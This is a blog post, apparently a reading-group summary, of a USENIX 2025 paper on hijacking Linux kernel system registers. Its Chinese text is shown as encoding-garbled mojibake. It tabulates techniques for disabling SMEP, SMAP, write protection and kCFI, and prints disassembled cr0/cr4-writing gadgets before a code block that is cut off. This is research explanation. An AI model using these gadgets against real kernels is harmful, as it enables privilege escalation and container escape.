<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="å†™åœ¨æœ€å‰é¢æœ€è¿‘åœ¨ç»„ä¼šä¸Šè¿›è¡Œäº†ä¸€æ¬¡è®ºæ–‡åˆ†äº«ï¼Œè€ƒè™‘åˆ°ä»¥ååšå®¢ä¸Šä¹Ÿä¸ä¼šå†æ›´æ–°ä»€ä¹ˆ CTF ç›¸å…³çš„å†…å®¹äº†ï¼Œè¦å¼€å§‹æ…¢æ…¢çš„è¿›è¡Œå†…å®¹è½¬å‹äº†ï¼Œæ‰€ä»¥æ‰“ç®—æŠŠå½“æ—¶ç»„ä¼šåˆ†äº«çš„å†…å®¹æ›´æ–°åˆ°åšå®¢ä¸Š:)  è¿™ç¯‡åšå®¢çš„è¯­è¨€é£æ ¼å°†ä»¥æˆ‘å½“æ—¶ç»„ä¼šæ±‡æŠ¥æ—¶çš„é£æ ¼è¿›è¡Œç¼–å†™ï¼Œå¯èƒ½å’Œä¹‹å‰çš„åšå®¢è¯­è¨€é£æ ¼æœ‰è¾ƒå¤§çš„åŒºåˆ«  System Register Hijackingç»„ä¼šæ±‡æŠ¥æ—¶ç”¨çš„PPTï¼šhttps:&#x2F;&#x2F;github.com&#x2F;Qanux&#x2F;paper">
<meta property="og:type" content="article">
<meta property="og:title" content="è®ºæ–‡åˆ†äº«: System Register Hijacking">
<meta property="og:url" content="https://qanux.github.io/2025/11/07/srh/index.html">
<meta property="og:site_name" content="Qanux&#39;s space">
<meta property="og:description" content="å†™åœ¨æœ€å‰é¢æœ€è¿‘åœ¨ç»„ä¼šä¸Šè¿›è¡Œäº†ä¸€æ¬¡è®ºæ–‡åˆ†äº«ï¼Œè€ƒè™‘åˆ°ä»¥ååšå®¢ä¸Šä¹Ÿä¸ä¼šå†æ›´æ–°ä»€ä¹ˆ CTF ç›¸å…³çš„å†…å®¹äº†ï¼Œè¦å¼€å§‹æ…¢æ…¢çš„è¿›è¡Œå†…å®¹è½¬å‹äº†ï¼Œæ‰€ä»¥æ‰“ç®—æŠŠå½“æ—¶ç»„ä¼šåˆ†äº«çš„å†…å®¹æ›´æ–°åˆ°åšå®¢ä¸Š:)  è¿™ç¯‡åšå®¢çš„è¯­è¨€é£æ ¼å°†ä»¥æˆ‘å½“æ—¶ç»„ä¼šæ±‡æŠ¥æ—¶çš„é£æ ¼è¿›è¡Œç¼–å†™ï¼Œå¯èƒ½å’Œä¹‹å‰çš„åšå®¢è¯­è¨€é£æ ¼æœ‰è¾ƒå¤§çš„åŒºåˆ«  System Register Hijackingç»„ä¼šæ±‡æŠ¥æ—¶ç”¨çš„PPTï¼šhttps:&#x2F;&#x2F;github.com&#x2F;Qanux&#x2F;paper">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://qanux.github.io/2025/11/07/srh/1.png">
<meta property="og:image" content="https://qanux.github.io/2025/11/07/srh/2.png">
<meta property="og:image" content="https://qanux.github.io/2025/11/07/srh/3.png">
<meta property="og:image" content="https://qanux.github.io/2025/11/07/srh/4.png">
<meta property="og:image" content="https://qanux.github.io/2025/11/07/srh/5.png">
<meta property="og:image" content="https://qanux.github.io/2025/11/07/srh/6.png">
<meta property="og:image" content="https://qanux.github.io/2025/11/07/srh/7.png">
<meta property="og:image" content="https://qanux.github.io/2025/11/07/srh/8.png">
<meta property="og:image" content="https://qanux.github.io/2025/11/07/srh/9.png">
<meta property="og:image" content="https://qanux.github.io/2025/11/07/srh/10.png">
<meta property="og:image" content="https://qanux.github.io/2025/11/07/srh/11.png">
<meta property="og:image" content="https://qanux.github.io/2025/11/07/srh/12.png">
<meta property="og:image" content="https://qanux.github.io/2025/11/07/srh/13.png">
<meta property="og:image" content="https://qanux.github.io/2025/11/07/srh/14.png">
<meta property="og:image" content="https://qanux.github.io/2025/11/07/srh/15.png">
<meta property="article:published_time" content="2025-11-06T16:00:00.000Z">
<meta property="article:modified_time" content="2025-11-07T09:20:44.894Z">
<meta property="article:author" content="Qanux">
<meta property="article:tag" content="CsomePro">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://qanux.github.io/2025/11/07/srh/1.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.jpg">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon.jpg" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/favicon.jpg">
        
      
    
    <!-- title -->
    <title>è®ºæ–‡åˆ†äº«: System Register Hijacking</title>
    <!-- async scripts -->
    <script>
    var _hmt = _hmt || [];
    (function() {
      var hm = document.createElement("script");
      hm.src = "https://hm.baidu.com/hm.js?dfa426831961b1170306cf91cfce69b4";
      var s = document.getElementsByTagName("script")[0]; 
      s.parentNode.insertBefore(hm, s);
    })();
    </script>
    
    
    <!-- Umami Analytics -->


    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 7.0.0"><link rel="alternate" href="/atom.xml" title="Qanux's space" type="application/atom+xml">
</head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fa-solid fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fa-solid fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/">Home</a></li><!--
     --><!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/friend/">Link</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/2025/11/18/bbox/"><i class="fa-solid fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/2025/11/03/2025%E5%B0%8F%E7%90%90%E7%A2%8E/"><i class="fa-solid fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fa-solid fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fa-solid fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://qanux.github.io/2025/11/07/srh/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://qanux.github.io/2025/11/07/srh/&text=è®ºæ–‡åˆ†äº«: System Register Hijacking"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://qanux.github.io/2025/11/07/srh/&title=è®ºæ–‡åˆ†äº«: System Register Hijacking"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://qanux.github.io/2025/11/07/srh/&is_video=false&description=è®ºæ–‡åˆ†äº«: System Register Hijacking"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=è®ºæ–‡åˆ†äº«: System Register Hijacking&body=Check out this article: https://qanux.github.io/2025/11/07/srh/"><i class="fa-solid fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://qanux.github.io/2025/11/07/srh/&title=è®ºæ–‡åˆ†äº«: System Register Hijacking"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://qanux.github.io/2025/11/07/srh/&title=è®ºæ–‡åˆ†äº«: System Register Hijacking"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://qanux.github.io/2025/11/07/srh/&title=è®ºæ–‡åˆ†äº«: System Register Hijacking"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://qanux.github.io/2025/11/07/srh/&title=è®ºæ–‡åˆ†äº«: System Register Hijacking"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://qanux.github.io/2025/11/07/srh/&name=è®ºæ–‡åˆ†äº«: System Register Hijacking&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://qanux.github.io/2025/11/07/srh/&t=è®ºæ–‡åˆ†äº«: System Register Hijacking"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    
    
      <div id="toc">
        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E5%9C%A8%E6%9C%80%E5%89%8D%E9%9D%A2"><span class="toc-number">1.</span> <span class="toc-text">å†™åœ¨æœ€å‰é¢</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#System-Register-Hijacking"><span class="toc-number">2.</span> <span class="toc-text">System Register Hijacking</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%86%99%E9%81%93%E6%9C%80%E5%90%8E"><span class="toc-number">3.</span> <span class="toc-text">å†™é“æœ€å</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#reference"><span class="toc-number">4.</span> <span class="toc-text">reference</span></a></li></ol>
      </div>
    
  </span>
</div>

    
    <div class="content index py4 ">
        
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle p-name" itemprop="name headline">
        è®ºæ–‡åˆ†äº«: System Register Hijacking
    </h1>



    <div class="meta">
      <span class="author p-author h-card" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span class="p-name" itemprop="name">Qanux</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2025-11-06T16:00:00.000Z" class="dt-published" itemprop="datePublished">2025-11-07</time>
        
      
    </div>


      

      

    </div>
  </header>
  

  <div class="content e-content" itemprop="articleBody">
    <h2 id="å†™åœ¨æœ€å‰é¢"><a href="#å†™åœ¨æœ€å‰é¢" class="headerlink" title="å†™åœ¨æœ€å‰é¢"></a>å†™åœ¨æœ€å‰é¢</h2><p>æœ€è¿‘åœ¨ç»„ä¼šä¸Šè¿›è¡Œäº†ä¸€æ¬¡è®ºæ–‡åˆ†äº«ï¼Œè€ƒè™‘åˆ°ä»¥ååšå®¢ä¸Šä¹Ÿä¸ä¼šå†æ›´æ–°ä»€ä¹ˆ CTF ç›¸å…³çš„å†…å®¹äº†ï¼Œè¦å¼€å§‹æ…¢æ…¢çš„è¿›è¡Œå†…å®¹è½¬å‹äº†ï¼Œæ‰€ä»¥æ‰“ç®—æŠŠå½“æ—¶ç»„ä¼šåˆ†äº«çš„å†…å®¹æ›´æ–°åˆ°åšå®¢ä¸Š:) </p>
<p>è¿™ç¯‡åšå®¢çš„è¯­è¨€é£æ ¼å°†ä»¥æˆ‘å½“æ—¶ç»„ä¼šæ±‡æŠ¥æ—¶çš„é£æ ¼è¿›è¡Œç¼–å†™ï¼Œå¯èƒ½å’Œä¹‹å‰çš„åšå®¢è¯­è¨€é£æ ¼æœ‰è¾ƒå¤§çš„åŒºåˆ« </p>
<h2 id="System-Register-Hijacking"><a href="#System-Register-Hijacking" class="headerlink" title="System Register Hijacking"></a>System Register Hijacking</h2><p>ç»„ä¼šæ±‡æŠ¥æ—¶ç”¨çš„PPTï¼š<a target="_blank" rel="noopener" href="https://github.com/Qanux/paper-presentations/blob/main/20251106.pdf">https://github.com/Qanux/paper-presentations/blob/main/20251106.pdf</a>  </p>
<p>ä»Šå¤©æˆ‘è¦åˆ†äº«çš„è¿™ç¯‡è®ºæ–‡æ¥è‡ª usenix 2025ï¼Œè®²çš„æ˜¯ linux kernel ä¸Šçš„ç³»ç»Ÿå¯„å­˜å™¨åŠ«æŒï¼Œè®ºæ–‡åä¸º <strong>System Register Hijacking: Compromising Kernel Integrity By Turning System Registers Against the System</strong>ï¼Œå¯ä»¥åœ¨å¦‚ä¸‹é“¾æ¥æ¥è¯¥æ‰¾åˆ°è®ºæ–‡çš„åŸæ–‡ï¼š<a target="_blank" rel="noopener" href="https://www.usenix.org/conference/usenixsecurity25/presentation/miller">System Register Hijacking</a>  </p>
<p>è¿™ç¯‡è®ºæ–‡æ˜¯æˆ‘å‡ å¤©å‰å¶ç„¶åˆ·åˆ°çš„ï¼Œæˆ‘è§‰å¾—æŒºå¥½ç©æ‰€ä»¥å°±å°†åŸæœ¬æ‰“ç®—åˆ†äº«çš„é‚£ç¯‡è®ºæ–‡ä¸´æ—¶æ›´æ”¹ä¸ºè¿™ç¯‡ã€‚è€ƒè™‘åˆ°è¿™ç¯‡è®ºæ–‡å¯èƒ½æœ‰äººè¯»è¿‡ä»¥åŠå°½å¯èƒ½çš„åœ¨è¾ƒçŸ­æ—¶é—´å†…è®²é€è¿™ç¯‡è®ºæ–‡ï¼Œæˆ‘è¿™é‡Œåªä¼šå¯¹è¿™ç¯‡è®ºæ–‡çš„é‡ç‚¹éƒ¨åˆ†è¿›è¡Œåˆ†äº«ã€‚  </p>
<blockquote>
<p>Kernel hijacking<br>Hijacking control flowï¼šropã€copã€jopã€call&#x2F;jmp shellcode<br>Hijacking data streamsï¼šdirty pipeã€dirty cred</p>
</blockquote>
<p>é»‘å®¢æ”»å‡» linux kernel æœ€å¸¸è§çš„ä¸¤ç§æ–¹å¼æ˜¯åŠ«æŒç¨‹åºæ§åˆ¶æµå’ŒåŠ«æŒç¨‹åºæ•°æ®æµï¼ŒåŠ«æŒæ§åˆ¶æµæ¯”è¾ƒå¸¸è§ï¼Œæ¯”å¦‚ ropã€cop ä»¥åŠ call æ¶æ„ä»£ç ç­‰ç­‰ã€‚è€ŒåŠ«æŒæ•°æ®æµåˆ™å¤šç”¨äºå‘åªè¯»æ–‡ä»¶ä¸­å†™å…¥ç”¨æˆ·è‡ªå®šä¹‰çš„æ¶æ„æ•°æ®ã€‚  </p>
<p>å¦‚å›¾ä¸­ blackhat çš„ ppt å°±æ˜¯é€šè¿‡ cve ä¿®æ”¹ kernel ä¸­çš„ file ç»“æ„ä½“è¿›è€Œè®©æ™®é€šç”¨æˆ·å¯ä»¥è¶Šæƒå‘ passwd æ–‡ä»¶ä¸­å†™å…¥è‡ªå·±çš„æ•°æ®ã€‚ </p>
<img src="/2025/11/07/srh/1.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  

<p>è€Œè¿™ç¯‡è®ºæ–‡ä¸­æå‡ºçš„ç³»ç»Ÿå¯„å­˜å™¨åŠ«æŒå¯ä»¥è®©åŠ«æŒç¨‹åºæµæ›´åŠ ç®€å•ã€‚</p>
<p>ä¼ ç»Ÿå†…æ ¸æ”»å‡»ä¾èµ–é€šç”¨å¯„å­˜å™¨ï¼Œè€Œå†…æ ¸å­˜åœ¨ç³»ç»Ÿå¯„å­˜å™¨ç›´æ¥æ§åˆ¶ CPU å®‰å…¨ç‰¹æ€§å’Œå…³é”®æ•°æ®å¦‚ä¸­æ–­æè¿°ç¬¦è¡¨ IDT å’Œé¡µè¡¨ç­‰ç­‰ï¼Œä¸‹é¢åˆ—å‡ºäº† cr0 å’Œ cr4 å¯„å­˜å™¨æ‰€æ§åˆ¶çš„ä¸€äº›å®‰å…¨ç‰¹æ€§ã€‚ç”±æ­¤å¯è§å¦‚æœæ”»å‡»è€…èƒ½è¿‡å¤ŸåŠ«æŒç³»ç»Ÿå¯„å­˜å™¨ï¼Œå°±èƒ½å¤Ÿé€ æˆå·¨å¤§çš„å®‰å…¨å¨èƒã€‚  </p>
<blockquote>
<p>CR0 ç›¸å…³ç‰¹æ€§<br>CR0.WP ï¼ˆå†™ä¿æŠ¤ï¼Œbit 16ï¼‰ï¼šå½“ç½®ä½æ—¶ï¼Œå†…æ ¸æ€å¯¹æ ‡è®°ä¸ºåªè¯»çš„é¡µä¹Ÿä¼šè¢«ç¦æ­¢å†™å…¥ã€‚å¸¸ç”¨äºä¿æŠ¤é¡µè¡¨ã€åªè¯»ä»£ç &#x2F;æ•°æ®ï¼›<br>CR0.PG ï¼ˆåˆ†é¡µå¯ç”¨ï¼Œbit 31ï¼‰ï¼šå¯ç”¨åˆ†é¡µæœºåˆ¶ï¼Œæ˜¯æ‰€æœ‰åŸºäºé¡µçš„éš”ç¦»&#x2F;æƒé™ï¼ˆU&#x2F;Sã€ NX ç­‰ï¼‰çš„åŸºç¡€ï¼›<br>CR0.PE ï¼ˆä¿æŠ¤æ¨¡å¼å¯ç”¨ï¼Œbit 0ï¼‰ï¼šå†³å®šæ˜¯å¦å¤„äºä¿æŠ¤æ¨¡å¼ï¼Œç°ä»£ç³»ç»Ÿå§‹ç»ˆå¼€å¯ï¼›ä¸å®‰å…¨éš”ç¦»çš„åŸºæœ¬å‰æç›¸å…³ã€‚<br>CR0.AM ï¼ˆå¯¹é½æ©ç ï¼Œbit 18ï¼Œé…åˆ EFLAGS.AC ï¼‰ï¼šå¯ç”¨å¯¹é½æ£€æŸ¥ï¼ˆä¸»è¦å¯¹ç”¨æˆ·æ€æœ‰æ•ˆï¼‰ï¼Œé™ä½æŸäº›æœªå¯¹é½è®¿é—®çš„æœªå®šä¹‰è¡Œä¸ºé£é™©ã€‚</p>
</blockquote>
<blockquote>
<p>CR4 ç›¸å…³ç‰¹æ€§<br>CR4.SMEP ï¼ˆSupervisor Mode Execution Preventionï¼Œbit 20ï¼‰ï¼šç¦æ­¢å†…æ ¸æ€æ‰§è¡Œç”¨æˆ·æ€é¡µé¢ä¸­çš„ä»£ç ï¼ˆU&#x2F;S&#x3D;1ï¼‰ï¼Œé˜²æ­¢â€œå†…æ ¸è·³åˆ°ç”¨æˆ·ä»£ç æ‰§è¡Œâ€çš„æ”»å‡»è·¯å¾„ã€‚<br>CR4.SMAP ï¼ˆSupervisor Mode Access Preventionï¼Œbit 21ï¼‰ï¼šç¦æ­¢å†…æ ¸æ€ç›´æ¥è¯»å†™ç”¨æˆ·æ€æ•°æ®ï¼ˆU&#x2F;S&#x3D;1ï¼‰ï¼Œé™¤éæš‚æ—¶é€šè¿‡ stac &#x2F; clac è®¾ç½® EFLAGS.AC å…è®¸è®¿é—®ï¼›é˜²æ­¢åˆ©ç”¨ä¸å®‰å…¨çš„ copy è·¯å¾„ã€‚<br>CR4.UMIP ï¼ˆUser-Mode Instruction Preventionï¼Œbit 11ï¼‰ï¼šé™åˆ¶ç”¨æˆ·æ€æ‰§è¡Œ SGDT&#x2F;SIDT&#x2F;SLDT&#x2F;SMSW&#x2F;STR ç­‰æŒ‡ä»¤è·å–ç³»ç»Ÿä¿¡æ¯ï¼Œç¼“è§£ä¿¡æ¯æ³„éœ²ä¸ KASLR ç»•è¿‡ã€‚<br>CR4.FSGSBASE ï¼ˆbit 16ï¼‰ï¼šå…è®¸ç”¨æˆ·æ€æ‰§è¡Œ wrgsbase&#x2F;rdgsbase&#x2F;rdfsbase&#x2F;wrfsbase ã€‚<br>CR4.PAE ï¼ˆbit 5ï¼‰ï¼šå¯ç”¨ç‰©ç†åœ°å€æ‰©å±•ï¼›åœ¨ 32 ä½æ¨¡å¼ä¸‹è¦ä¸ IA32_EFER.NXE ä¸€èµ·æ‰èƒ½ä½¿ç”¨ NX ï¼ˆä¸å¯æ‰§è¡Œï¼‰ä½ï¼Œå®ç°æ•°æ®æ‰§è¡Œä¿æŠ¤ï¼ˆDEPï¼‰ã€‚<br>CR4.PKE ï¼ˆProtection Keys for Userspaceï¼Œbit 22ï¼‰ï¼šå¯ç”¨ç”¨æˆ·æ€å†…å­˜ä¿æŠ¤é”®ï¼ˆPKUï¼‰ï¼Œé…åˆ PKRU åœ¨ç”¨æˆ·æ€ç»†ç²’åº¦åœ°ç¦&#x2F;å…è¯»å†™æ‰§è¡Œï¼Œå¼ºåŒ–éš”ç¦»ç­–ç•¥ã€‚</p>
</blockquote>
<img src="/2025/11/07/srh/2.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  

<blockquote>
<p>Table 1: Security-Sensitive System Register-modifying instructions identified on x86-64 and aarch64, which mitigations or structures they control, and the preconditions necessary (SC is Stack Control, RC is Register Control). Representative gadgets for each instruction where valid gadgets that are short enough to display were present are listed beneath the associated instruction. * Their iret, popf, stac, and clac instructions are able to modify the AC bit in the EFLAGS register, which controls the status of SMAP.</p>
</blockquote>
<p>è®ºæ–‡çš„ä½œè€…åœ¨ linux kernel ä¸­æ‰¾åˆ°éå¸¸å¤šå¯ä»¥ç”¨äºä¿®æ”¹ç³»ç»Ÿå¯„å­˜å™¨çš„ gadgetï¼Œå¦‚ä¸Šå›¾è¡¨æ ¼æ‰€ç¤ºï¼Œå…¶ä¸­è¿™äº› gadget åŒ…æ‹¬ x86-64 å’Œ aarch64 ä¸¤ç§æ¶æ„ï¼Œè¿™æ¬¡è®ºæ–‡åˆ†äº«åˆ™ä¸“æ³¨äº x86-64 è¿™ä¸ªç»“æ„ã€‚  </p>
<table>
<thead>
<tr>
<th>Architecture</th>
<th>Technique</th>
<th>Target Register</th>
<th>Prerequisites</th>
<th>Defense Bypassed</th>
</tr>
</thead>
<tbody><tr>
<td>x86-64</td>
<td>swapgs Stack Pivoting</td>
<td>GSBase</td>
<td>No register&#x2F;stack control</td>
<td>FineIBT&#x2F;kCFI</td>
</tr>
<tr>
<td>x86-64</td>
<td>popf Extension + RetSpill</td>
<td>EFLAGS.AC</td>
<td>Stack control</td>
<td>SMAP</td>
</tr>
<tr>
<td>x86-64</td>
<td>cr4 Hijacking</td>
<td>cr4</td>
<td>Register control</td>
<td>SMEP&#x2F;SMAP</td>
</tr>
<tr>
<td>x86-64</td>
<td>cr0 Hijacking</td>
<td>cr0</td>
<td>Register control</td>
<td>Write Protection (WP)</td>
</tr>
<tr>
<td>x86-64</td>
<td>IDT Hijacking</td>
<td>IDTR</td>
<td>Stack control</td>
<td>Exception Handling Mechanism</td>
</tr>
<tr>
<td>AArch64</td>
<td>PAN Hijacking</td>
<td>PAN MSR</td>
<td>Register control</td>
<td>PAN (Privileged Access Never)</td>
</tr>
<tr>
<td>AArch64</td>
<td>SPSR_EL1 Hijacking</td>
<td>SPSR_EL1</td>
<td>Stack control + Register control</td>
<td>PAN + Control Flow</td>
</tr>
</tbody></table>
<p>ä½œè€…é€šè¿‡ä»–æ‰¾åˆ°çš„ gadget æå‡ºäº†7ç§ linux kernel åŸºäºåŠ«æŒç³»ç»Ÿå¯„å­˜å™¨çš„æ”»å‡»æŠ€æœ¯ï¼Œä¸»è¦åˆ†ä¸ºä¸¤ç±»åŠ«æŒç›®æ ‡ï¼Œä¸€ç§æ˜¯åŠ«æŒç‰¹æ€§æ§åˆ¶å¯„å­˜å™¨å»ç¦ç”¨ä¸€äº›å®‰å…¨æœºåˆ¶è¿›è€Œè®©æ”»å‡»è€…æ›´å¥½çš„è¿›è¡Œæ¼æ´çš„åˆ©ç”¨ï¼Œå¦å¤–ä¸€ç§åˆ™æ˜¯åŠ«æŒç»“æ„åœ°å€å¯„å­˜å™¨å»æ§åˆ¶ä¸€äº›éå¸¸é‡è¦çš„å†…æ ¸ç»“æ„ä½“è¿›è€Œå»æ„é€ æ›´åŠ å¼ºå¤§çš„åˆ©ç”¨åŸè¯­ã€‚  </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">virtual_mapped:</span><br><span class="line">  &lt;+35&gt;: mov cr0,rax</span><br><span class="line">  &lt;+38&gt;: mov rax,rbp</span><br><span class="line">  &lt;+41&gt;: popf</span><br><span class="line">  &lt;+42&gt;: pop r15</span><br><span class="line">  &lt;+44&gt;: pop r14</span><br><span class="line">  &lt;+46&gt;: pop r13</span><br><span class="line">  &lt;+48&gt;: pop r12</span><br><span class="line">  &lt;+50&gt;: pop rbp</span><br><span class="line">  &lt;+51&gt;: pop rbx</span><br><span class="line">  &lt;+52&gt;: ret</span><br><span class="line"></span><br><span class="line">sev_verify_cbit:</span><br><span class="line">  &lt;+69&gt;: mov cr4,rsi</span><br><span class="line">  &lt;+72&gt;: je sev_verify_cbit+87</span><br><span class="line">  &lt;+74&gt;: xor rsp,rsp</span><br><span class="line">  &lt;+77&gt;: sub rsp,0x1000</span><br><span class="line">  &lt;+84&gt;: hlt</span><br><span class="line">  &lt;+85&gt;: jmp sev_verify_cbit+84</span><br><span class="line">  &lt;+87&gt;: mov rax,rdi</span><br><span class="line">  &lt;+90&gt;: jmp __x86_return_thunk</span><br></pre></td></tr></table></figure>

<p>ä½œè€…å†…æ ¸ä¸­æ‰¾åˆ°äº†ä¸€äº›éå¸¸å¥½ç”¨çš„ gadget å¯ä»¥ç›´æ¥æ§åˆ¶ cr0 å’Œ cr4 è¿™ä¸¤ä¸ªå¯„å­˜å™¨ï¼Œå¦‚ä¸Šé¢æ‰€ç¤ºï¼Œæ”»å‡»è€…å¯ä»¥åˆ©ç”¨è¿™äº› gadget å»ä¿®æ”¹ cr0 å’Œ cr4 å¯„å­˜å™¨å…³é—­ä¸€äº›ä¿æŠ¤æœºåˆ¶è¿›è€Œé™ä½ rop é“¾çš„ç¼–å†™éš¾åº¦ï¼Œæ¯•ç«Ÿé«˜ç‰ˆæœ¬çš„ kernel æ¯”è¾ƒå¥½ç”¨çš„ gadget éå¸¸å°‘ï¼Œé€šå¸¸ä¸ºäº†æ§åˆ¶ä¸€ä¸ªé€šç”¨å¯„å­˜å™¨éœ€è¦å¤šä¸ª gadget è¿›è¡Œç»„åˆã€‚  </p>
<p>åŒæ—¶ä½œè€…ä¹Ÿæå‡ºå¯ä»¥ç”¨ popf;ret è¿™ä¸ª gadget æ¥è®© rop å˜å¾—æ›´åŠ å®¹æ˜“ã€‚å½“ç”¨æˆ·æ€åˆ‡æ¢åˆ°å†…æ ¸æ€æ—¶ï¼Œos ä¼šå°†ç”¨æˆ·æ€çš„å¯„å­˜å™¨ä¿å­˜åœ¨ kernel çš„æ ˆä¸Šï¼Œè¿™ä¸ªç»“æ„è¢«å«åš pt_regsï¼Œè¿™ä¸ªç»“æ„åœ¨æ—©æœŸçš„ kernel ç‰ˆæœ¬ä¸­åœ¨æ ˆä¸­çš„åç§»æ˜¯å›ºå®šçš„  </p>
<img src="/2025/11/07/srh/3.png" class="" title="æˆ‘çš„å›¾å›¾å‘¢">  

<p>æ”»å‡»è€…åœ¨å¯ä»¥åœ¨ç”¨æˆ·æ€æå‰åœ¨è¿™äº›é€šç”¨å¯„å­˜å™¨ä¸Šå¸ƒç½®å¥½ rop é“¾ï¼Œç„¶ååœ¨å†…æ ¸æ€åŠ«æŒç¨‹åºæµæ—¶ç›´æ¥æ ˆè¿ç§»åˆ°è¿™ä¸ªæ ˆä¸Šçš„ç»“æ„è¿›è¡Œ ropã€‚ä½†æ˜¯é€šç”¨å¯„å­˜å™¨çš„æ•°é‡æ˜¯æœ‰é™çš„ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬ rop çš„é•¿åº¦æ˜¯æœ‰é™çš„ï¼Œè€Œå½“æˆ‘ä»¬çš„ç›®çš„ä¸å†æ˜¯ææƒè€Œæ˜¯è¿›è¡Œå®¹å™¨é€ƒé€¸æ¯”å¦‚ docker æˆ–è€… nsjail é€ƒé€¸æ—¶ï¼Œrop çš„é•¿åº¦å°†ä¼šå˜å¾—éå¸¸çš„é•¿  </p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span 